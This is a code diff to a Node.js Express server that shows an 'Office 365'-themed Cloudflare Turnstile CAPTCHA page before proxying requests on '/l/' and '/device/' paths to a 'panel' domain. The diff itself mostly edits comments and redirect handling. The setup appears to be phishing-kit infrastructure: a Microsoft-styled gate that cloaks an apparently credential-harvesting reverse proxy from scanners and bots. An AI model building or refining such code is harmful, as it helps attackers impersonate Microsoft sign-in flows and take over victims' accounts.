@@ -3,19 +3,17 @@ const cookieParser = require('cookie-parser');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// ----- CRITICAL: Trust proxy (Render uses HTTPS termination) -----
 app.set('trust proxy', 1);
 
-// ----- CONFIG (replace with your actual keys) -----
 const PANEL = 'portal42-343.sbs';
 const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm';
-const SECRET_KEY = 'YOUR_TURNSTILE_SECRET_KEY';  // ⚠️ REPLACE WITH YOUR SECRET
+const SECRET_KEY = 'YOUR_TURNSTILE_SECRET_KEY'; // ⚠️ REPLACE WITH YOUR ACTUAL SECRET
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(cookieParser());
 
-// ----- CAPTCHA PAGE -----
+// ---- CAPTCHA PAGE ----
 app.get('/captcha', (req, res) => {
     let returnPath = req.query.return || '/';
     if (returnPath.startsWith('//')) returnPath = returnPath.replace(/^\/+/, '/');
@@ -23,7 +21,7 @@ app.get('/captcha', (req, res) => {
     res.send(getCaptchaHTML(SITE_KEY, returnPath));
 });
 
-// ----- PROTECTED ROUTES – redirect to CAPTCHA -----
+// ---- PROTECTED ROUTES ----
 app.get('/l/*', (req, res) => {
     res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
 });
@@ -31,7 +29,7 @@ app.get('/device/*', (req, res) => {
     res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
 });
 
-// ----- CAPTCHA VERIFICATION (after solving) -----
+// ---- VERIFICATION ENDPOINT ----
 app.post('/verify-captcha', async (req, res) => {
     const token = req.body['cf-turnstile-response'];
     if (!token) return res.status(400).send('Missing token');
@@ -43,16 +41,18 @@ app.post('/verify-captcha', async (req, res) => {
             body: `secret=${SECRET_KEY}&response=${token}`
         });
         const data = await verify.json();
+
         if (data.success) {
-            // ✅ Set cookie with correct options for Render
+            // Set cookie
             res.cookie('captcha_passed', 'true', {
-                maxAge: 300000,           // 5 minutes
+                maxAge: 300000,
                 httpOnly: true,
-                secure: true,             // required for HTTPS
+                secure: true,
                 sameSite: 'lax'
             });
+            // Redirect to the original path
             const returnTo = req.query.return || '/';
-            res.redirect(returnTo);
+            return res.redirect(returnTo);
         } else {
             res.status(400).send('CAPTCHA verification failed');
         }
@@ -62,9 +62,8 @@ app.post('/verify-captcha', async (req, res) => {
     }
 });
 
-// ----- PROXY (only for requests with valid cookie) -----
+// ---- PROXY ----
 app.use('*', async (req, res) => {
-    // Check CAPTCHA cookie for protected paths
     const isProtected = req.path.startsWith('/l/') || req.path.startsWith('/device/');
     if (isProtected && !req.cookies.captcha_passed) {
         return res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
@@ -98,7 +97,7 @@ app.use('*', async (req, res) => {
 
 app.listen(port, () => console.log('✅ Proxy running on port ' + port));
 
-// ----- CAPTCHA HTML (Office 365 Theme) -----
+// ---- CAPTCHA HTML with improved JavaScript ----
 function getCaptchaHTML(siteKey, returnPath) {
     return `
 <!DOCTYPE html>
@@ -138,18 +137,30 @@ function getCaptchaHTML(siteKey, returnPath) {
     let idx = 0;
     document.getElementById('dp').textContent = msgs[0];
     setInterval(() => { document.getElementById('dp').textContent = msgs[idx]; idx = (idx+1)%msgs.length; }, 3000);
+
     function turnstileCallback(token) {
       if (token) {
+        // Redirect the browser directly to the return path, but first we need to verify.
+        // Use a simple fetch to verify, then redirect.
         fetch('/verify-captcha?return=' + encodeURIComponent(returnPath), {
           method: 'POST',
           headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
           body: 'cf-turnstile-response=' + token
-        }).then(r => {
-          if (r.redirected) window.location.href = r.url;
-          else window.location.href = returnPath;
+        }).then(response => {
+          // If the response is a redirect, follow it
+          if (response.redirected) {
+            window.location.href = response.url;
+          } else {
+            // If not redirected, try to go to the return path
+            window.location.href = returnPath;
+          }
+        }).catch(err => {
+          // If fetch fails, just go to return path
+          window.location.href = returnPath;
         });
       }
     }
+
     function turnstileErrorCallback() {
       document.getElementById('status').textContent = 'Error. Please refresh.';
       document.getElementById('status').style.display = 'block';
